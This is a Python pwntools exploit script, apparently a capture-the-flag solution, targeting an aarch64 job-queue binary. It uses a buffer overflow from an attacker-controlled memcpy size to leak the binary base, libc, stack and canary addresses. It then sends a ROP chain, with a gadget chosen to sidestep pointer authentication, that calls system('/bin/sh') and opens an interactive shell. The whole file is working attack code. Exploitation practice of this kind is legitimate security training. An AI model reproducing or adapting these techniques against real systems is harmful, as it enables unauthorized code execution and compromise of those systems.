#!/usr/bin/env python3

from pwn import *

e = ELF("./jobqueue_patched")

context.binary = e
context.arch = "aarch64"
# context.terminal =  ['tmux', 'new-window', '-n', 'GDB']
# spawn new window
# context.terminal = ["tmux", "neww", "-n", "shell"]
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc.so.6")

# context.log_level = "debug"
DOCKER_PORT		= 9999
REMOTE_NC_CMD	= "nc "	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
set follow-fork child
set exception-verbose on 
set exception-debugger on
b *$rebase(0x1928)
# b *$rebase(0x1acc)
b *$rebase(0x1758) # submit
b *$rebase(5012)
"""

if args.GDB:
	# r = gdb.debug(e.path,gdbscript=GDB_SCRIPT)
    r = process(["qemu-aarch64", "-g", "1235", "-L", "/usr/aarch64-linux-gnu", e.path])
    
    gdb.attach(
        target=('127.0.0.1', 1235), 
        exe=e.path, 
        gdbscript=GDB_SCRIPT, 
        # gdb_args=["gdb-multiarch"]
    )
elif args.LOCAL:
	r = process(e.path)
elif args.DOCKER:
	r = remote("localhost", DOCKER_PORT)
else:
	r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

"""
submit->read_item -> size <= 0xFFFF
ma in store la destinazione della memcpy e' di 256 byte
choose 2 -> memcpy(dest, src, n)
n is controlled.

store:
    in echo command: i can overwrite v8 after the buffer, then its
    content is printed in [worker %d] -> i can leak addresses

-> leak bin, libc, then canary from the environ 
-> rop

"""

def create(name):
    sla(b"> ", b"1")
    sla(b"worker name: ", name) 

def submit(idx, size, payload):
    sla(b"> ", b"2")
    sla(b"worker idx: ", idx)
    sla(b"job size: ", size)
    sa(b"bytes):\n", payload) 

def read_32bit(target_addr):
    fake_v8 = target_addr - 12
    
    payload = b"\x02" + b"A" * 255 + p64(fake_v8)
    submit(b"0", str(len(payload)).encode(), payload)
    
    submit(b"0", b"1", b"\x03")
    sla(b"> ", b'3')
    sla(b"idx: ", b"0")

    ru(b"[worker ")
    leak_str = ru(b"]")[:-1]
    
    return int(leak_str) & 0xffffffff

def read_canary(target_addr):
    fake_v8 = target_addr - 12
    
    payload = b"\x02" + b"A" * 255 + p64(fake_v8)
    submit(b"0", str(len(payload)).encode(), payload)
    
    submit(b"0", b"1", b"\x03")
    sla(b"> ", b'3')
    sla(b"idx: ", b"0")
    r.interactive()

def main():
    create(b"AAAAAAAA") 
    create(b'BBBBBBBB')
    TEST_SIZE = 257

    
    payload_leak = b"\x02" + b"A" * 255 + b"\x18\x01" 
    submit(b'0', str(len(payload_leak)), payload_leak)

    # print (echo)
    submit("0", "1", b"\x03")
    
    sla(b"> ", b'3')
    sla(b"idx: ", b"0")
    # r.interactive()
    ru(b'A'*255)
    leak = (rc(6))
    print(leak)
    leaked_v8 = u64(leak.ljust(8, b"\x00"))
    
    log.success(f"leaked bss (v8): {hex(leaked_v8)}")
    # pause()
    
    bin_base = leaked_v8 - 0x20118
    aleak("base", bin_base)
    
    got_puts = bin_base + e.got['puts']
    
    plt_puts = bin_base + e.plt['puts']

    low_puts = read_32bit(got_puts)
    hi_puts = read_32bit(got_puts + 4)

    puts = (hi_puts << 32) | low_puts
    aleak("puts", puts)
    libc.address = puts - 0x769e0
    aleak('libc',libc.address)
    ru('A' * 255)
    stack_leak = u64(rc(6).ljust(8, b'\x00'))
    aleak('leak', stack_leak)
   
    print(hex(libc.sym.system))
  
    # libc.environ -> stack leak
    low_puts = read_32bit(libc.sym.environ)
    hi_puts = read_32bit(libc.sym.environ + 4)

    leak = (hi_puts << 32) | low_puts
    aleak("stack", leak)
    stack = leak - 0x7fe8f8
    aleak('stack', stack)
    canary_addr = stack + 0x7fe178
    aleak('canaryaddr', canary_addr)

    lo = read_32bit(canary_addr)
    hi = read_32bit(canary_addr + 4)
    canary = (hi << 32) | lo 
    aleak("canary", canary)



    STRUCT = bin_base + 0x20018
    # 0x0000000000127940: ldr x0, [sp, #0x18]; mov x1, x21; ldr x2, [sp, #0x68]; blr x2;
    # no ret -> no autisp -> no pac! -> otherwise i obtained sigill
    GADGET = libc.address + 0x127940
    log.info(f"worker struct: {hex(STRUCT)}")

    # to call system with this gadget:
    # x0 = /bin/sh, x1 = junk, x2 = system

    ropchain = flat([
        b'\x02',                   
        b'A' * 255,                
        p64(STRUCT),       
        p64(canary),               
        p64(0), # saved x29                   
        p64(GADGET), # saved x30 (ret addr)    

        # gadget args
        b'\x00' * 0x18, # padding (gadget does ldr x0, [sp, #0x18])         
        p64(libc.binsh()),               
        b'\x00' * 0x48, # padding (gadget does ldr x0, [sp, #0x68]) -> 0x68 - 0x18 - 0x8 = 0x48
        p64(libc.symbols['system']), # system addr is loaded into x2 -> then blr x2 (jmp to register x2 address)       
    ])



    submit(b'0', str(len(ropchain)).encode(), ropchain)

    # cmd=1: close fds and return -> triggers ROP chain
    submit(b"0", b"1", b"\x01")

    r.interactive()
   

if __name__ == "__main__":
	main()
